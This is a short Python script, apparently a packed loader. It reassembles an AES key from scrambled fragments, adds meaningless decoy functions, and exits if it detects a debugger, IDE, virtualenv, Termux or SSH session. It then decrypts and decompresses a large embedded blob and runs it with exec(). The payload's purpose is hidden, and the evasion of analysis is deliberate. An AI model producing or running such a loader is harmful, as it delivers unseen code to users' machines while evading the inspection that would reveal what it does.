#IMAD 213 CODE 2025
import sys, os, zlib, base64
from Crypto.Cipher import AES

def f1(x): return x[::-1]
def f2(x): return ''.join(chr(ord(c)^0x5A) for c in x)
def f3(x): return ''.join(chr((ord(c)+7)%256) for c in x)
def f4(x): return ''.join(chr((ord(c)-7)%256) for c in x)
def f5(x): return x.swapcase()
uf = [f1, f2, f4, f3, f5]

def xor_decrypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def reconstruct_key(parts, indices, types):
    ordered = [None]*len(parts)
    for i, idx in enumerate(indices):
        part = parts[i][2:-2]
        func = uf[types[i]]
        ordered[idx] = func(part)
    k = ''.join(ordered)
    pad = len(k) % 4
    if pad: k += '='*(4-pad)
    return base64.b64decode(k)

def tAo2Oexr(): return 740
def fqq6112v(): return 842
def AXna0uXa(): return 968
def a9CP8f2d(): return 588
def AceVVXl0(): return 126
def HOtwWQwL(): return 765
def Gg0FLV5J(): return 575
def qRDrxTR5(): return 49
def zgTbA6dm(): return 846
def esljhPCL(): return 648
def Sed5EqYp(): return 3
def h0QwJS13(): return 677

parts = ['MsKwO9a3Oy', 'DJS$Mck_hY', 'nupN@2txUA', 'KTmvgRinIP', 'o10mxHtiDg', 'W11\x1c\x1chc\tTQ', 'ju/?i)]eST', 'zo)gJK']
indices = [4, 3, 0, 5, 2, 6, 1, 7]
types = [0, 3, 2, 0, 4, 1, 3, 1]
nonce = base64.b64decode("SmPzvW2Q+nsM7uh5")
tag = base64.b64decode("6j3v7krgG2JGS5Fh5yvjGA==")
ciphertext_b64 = "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"
xorkey_b64 = "Udid1dt/R22S7u7f8wJHTg=="

if any(env in os.environ for env in ["PYCHARM_HOSTED", "VIRTUAL_ENV", "TERMUX", "SSH_CONNECTION"]) or "pydevd" in sys.modules:
    print("Blocked environment detected. Exiting.")
    sys.exit(1)

try:
    key = reconstruct_key(parts, indices, types)
    xorkey = base64.b64decode(xorkey_b64)
    ct = base64.b64decode(ciphertext_b64)
    raw = xor_decrypt(ct, xorkey)
    dec = AES.new(key, AES.MODE_GCM, nonce=nonce)
    code = dec.decrypt_and_verify(raw, tag)
    exec(zlib.decompress(code).decode())
except Exception as e:
    print("Decryption failed:", e)
    sys.exit(1)
